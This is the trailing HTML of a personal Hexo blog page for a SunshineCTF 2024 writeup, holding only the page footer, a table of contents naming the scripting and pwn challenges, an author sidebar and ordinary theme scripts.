      <a href="/2024/10/02/Pwnable-bookwriter/"></a>
      <div class="article-nav-caption">Older</div>
      <h3 class="article-nav-title">
        
          Pwnable.tw-BookWriter
        
      </h3>
    </div>
    
  </nav>


</article>






</section>
        </div>
        
        
        <footer id="footer">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div id="footer-info">
    
    <div>
      <span class="icon-copyright"></span>
      2020-2025
      <span class="footer-info-sep rotate"></span>
      Naup堇姬
    </div>
    
      <div>
        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
      </div>
    
    
      <div>
        <span class="icon-brush"></span>
        137.6k
        &nbsp;|&nbsp;
        <span class="icon-coffee"></span>
        12:14
      </div>
    
    
    
    
      <div>
        <span class="icon-eye"></span>
        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
        &nbsp;|&nbsp;
        <span class="icon-user"></span>
        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
      </div>
    
  </div>
</footer>

        
          <div class="sidebar-top">
            <div class="sidebar-top-taichi rotate"></div>
            <div class="arrow-up"></div>
          </div>
        
        <div id="mask" class="hide"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper toc-div-class" >
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SunshineCTF-2024-writeup-by-naup96321"><span class="toc-number">1.</span> <span class="toc-text">SunshineCTF 2024 writeup-by.naup96321</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#My-solve-list"><span class="toc-number">1.0.1.</span> <span class="toc-text">My solve list</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-team-score-board"><span class="toc-number">1.0.2.</span> <span class="toc-text">My team score board</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Scripting"><span class="toc-number">2.</span> <span class="toc-text">Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-0"><span class="toc-number">2.1.</span> <span class="toc-text">Guessy Programmer 0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script"><span class="toc-number">2.1.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-1"><span class="toc-number">2.2.</span> <span class="toc-text">Guessy Programmer 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-2"><span class="toc-number">2.3.</span> <span class="toc-text">Guessy Programmer 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guessy-Programmer-3"><span class="toc-number">2.4.</span> <span class="toc-text">Guessy Programmer 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">script</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag-Shop"><span class="toc-number">3.1.</span> <span class="toc-text">Flag Shop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-4"><span class="toc-number">3.1.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Adventure-On-the-High-C"><span class="toc-number">3.2.</span> <span class="toc-text">Adventure! On the High C!</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-5"><span class="toc-number">3.2.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heap01"><span class="toc-number">3.3.</span> <span class="toc-text">heap01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#script-6"><span class="toc-number">3.3.1.</span> <span class="toc-text">script</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#after"><span class="toc-number">3.4.</span> <span class="toc-text">after</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
  <div class="sidebar-author-name">Naup堇姬</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">55</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">4</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-email sidebar-social-icon">
      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
    </div>
  
    <div class="icon-github sidebar-social-icon">
      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Home</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">Archives</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
        <div class="sidebar-menu-icon icon rotate">
          &#xe62b;
        </div>
        <div class="sidebar-menu-link">About</div>
      </div>
    
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>



<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Naup堇姬",
          title: "SunshineCTF 2024 writeup-by.naup96321",
          url: "http://example.com/2024/10/22/sunshineCTF-2024-writeup/",
          excerpt: "",
          description: "",
          stripContent: "SunshineCTF 2024 writeup-by.naup96321 Author: 堇姬NaupWAN - r.k.10  This is myself some solve script and easy writeup. Just record some questions My solve listimage My team score boardimage ScriptingThis catagory challenge give you one git bundleUse 1g",
          date: "Tue Oct 22 2024 20:03:47 GMT+0800",
          updated: "Tue Oct 22 2024 20:05:18 GMT+0800",
          cover: "/images/banner.webp",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      








    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>







  </body>
  </html>

